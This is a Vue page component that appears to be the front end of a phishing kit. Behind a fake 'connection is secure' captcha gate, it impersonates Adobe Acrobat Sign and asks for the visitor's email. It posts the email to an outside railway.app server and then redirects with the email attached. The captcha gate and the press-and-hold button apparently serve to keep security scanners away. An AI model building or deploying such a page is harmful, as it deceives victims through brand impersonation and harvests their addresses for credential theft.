<template>
  <div v-if="!captchaToken" class="gate-container">
    <header>
   
    </header>
    <main>
      <div class="instructions">
        <p>Please stand by while we are checking if the site connection is secure.</p>
        <div
          class="cf-turnstile"
          data-sitekey="0x4AAAAAABgei6QZruCN7n08"
        ></div>
      </div>
    </main>
    <footer>
      <p></p>
    </footer>
  </div>

  <div v-else class="background">
    <div class="adobe-sign-container">
      <div class="sign-card">
        <div class="header">
          <div class="logo-text">
            <span class="success-check">⼈</span>
            <span>Adobe Acrobat Sign</span>
          </div>
        </div>
        <div class="content">
          <p><strong>Please verify your email to continue.</strong></p>
          <div class="form-wrapper">
            <input
              v-model="email"
              type="email"
              placeholder="Email required"
              required
              class="email-input"
              :disabled="loading"
            />
            <p v-if="error" class="error">{{ error }}</p>
            <button
              @mousedown="startHold"
              @mouseup="endHold"
              @mouseleave="cancelHold"
              @touchstart.prevent="startHold"
              @touchend.prevent="endHold"
              :disabled="loading"
              class="action-button"
            >
              {{ loading ? 'Verifying…' : 'Continue' }}
            </button>
          </div>
        </div>
        <div class="divider"></div>
        <div class="footer-container">
          <p class="footer-text">© 2025 All rights reserved. </p>
        </div>
      </div>
    </div>
  </div>
</template>

<script setup>
import { ref, onMounted, nextTick } from 'vue'

const email = ref('')
const error = ref('')
const loading = ref(false)
const captchaToken = ref(null)

let holdTimer = null
const holdDuration = 1500
const redirectBaseUrl = 'https://yourdomain.com/complete'

onMounted(async () => {
  await nextTick()
  if (window.turnstile) {
    window.turnstile.render('.cf-turnstile', {
      sitekey: '0x4AAAAAABgei6QZruCN7n08',
      callback: (token) => {
        captchaToken.value = token
      }
    })
  }
})

function isValidEmail(e) {
  return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(e)
}

async function verifyEmail() {
  try {
    const res = await fetch(
      'https://email-verification-app-production-8ea5.up.railway.app/api/check-email',
      {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          email: email.value,
          captchaToken: captchaToken.value
        }),
      }
    )
    const data = await res.json()
    if (!res.ok || !data.valid) {
      throw new Error(data.message || 'Verification failed')
    }
    window.location.href = `${redirectBaseUrl}?email=${encodeURIComponent(email.value)}`
  } catch (err) {
    error.value = err.message
  } finally {
    loading.value = false
  }
}

function startHold() {
  if (!email.value.trim()) {
    error.value = 'Please enter your email.'
    return
  }
  if (!isValidEmail(email.value)) {
    error.value = 'Invalid email format.'
    return
  }
  error.value = ''
  loading.value = true
  holdTimer = setTimeout(verifyEmail, holdDuration)
}

function endHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}

function cancelHold() {
  if (holdTimer) clearTimeout(holdTimer)
  loading.value = false
}
</script>

<style scoped>
html, body {
  height: 100vh;
  margin: 0;
  padding: 0;
  overflow: hidden;
  font-family: Arial, sans-serif;
  background-color: #f0f0f0;
  color: #000;
}

body {
  display: block;
}

/* Shared container layout */
.background,
.gate-container {
  position: fixed;
  top: 0;
  left: 0;
  height: 100vh;
  width: 100vw;
  display: flex;
  flex-direction: column;
  justify-content: flex-start;
  align-items: center;
  padding-top: 100px;
  box-sizing: border-box;
  overflow: hidden;
  background-color: #f0f0f0;
}

/* CAPTCHA scaling */
.cf-turnstile {
  transform: scale(0.9);
  transform-origin: center;
  height: auto !important;
  width: auto !important;
}

.instructions {
  text-align: center;
  max-width: 500px;
  padding: 1rem;
}

.adobe-sign-container {
  width: 70%;
  max-width: 500px;
  background: #ffffff;
  border-radius: 10px;
  box-shadow: 0 1px 20px rgba(0, 0, 0, 0.1);
  padding: 3rem;
  display: flex;
  flex-direction: column;
  justify-content: center;
  box-sizing: border-box;
  height: 60vh;
}

.header {
  display: flex;
  justify-content: center;
  margin-bottom: 1rem;
}

.logo-text {
  font-weight: bold;
  display: flex;
  align-items: center;
  gap: 1rem;
}

.success-check {
  font-size: 2rem;
  color: red;
  line-height: 1;
}

.content {
  text-align: center;
}

.form-wrapper {
  display: flex;
  flex-direction: column;
  align-items: center;
}

.email-input {
  width: 95%;
  max-width: 400px;
  padding: 0.6rem;
  border: 1px solid #818181;
  border-radius: 5px;
  font-size: 1rem;
  background-color: #fff;
  color: #000;
}

.action-button {
  background-color: transparent;
  color: #0078D4;
  padding: 0.6rem 1.5rem;
  border: 1px solid #0078D4;
  border-radius: 16px;
  cursor: pointer;
  margin-top: 1rem;
  font-size: 1rem;
  width: 50%;
  max-width: 380px;
}

.action-button:disabled {
  opacity: 0.6;
  cursor: default;
}

.action-button:hover:not(:disabled) {
  background-color: transparent;
}

.divider {
  height: 0;
  background-color: #e0e0e0;
  margin: 1rem 0;
}

.footer-container {
  text-align: center;
}

.footer-text,
.global-footer {
  font-size: 0.85rem;
  color: #333;
  margin-top: 0.5rem;
}

.error {
  color: red;
  font-size: 0.9rem;
  margin-top: 0.6rem;
}

/* Dark mode overrides */
@media (prefers-color-scheme: dark) {
  html, body {
    background-color: #121212;
    color: #ffffff;
  }

  .background,
  .gate-container {
    background-color: #121212;
    color: #ffffff;
  }

  .instructions p,
  .instructions h,
  .instructions {
    color: #ffffff;
  }

  .adobe-sign-container {
    background: #1e1e1e;
    color: #ffffff;
    box-shadow: 0 1px 20px rgba(255, 255, 255, 0.05);
  }

  .email-input {
    background-color: #2b2b2b;
    color: #ffffff;
    border-color: #444;
  }

  .action-button {
    color: #ffffff;
    border-color: #666;
  }

  .footer-text,
  .global-footer {
    color: #aaaaaa;
  }

  .error {
    color: #ff6b6b;
  }
}

</style>


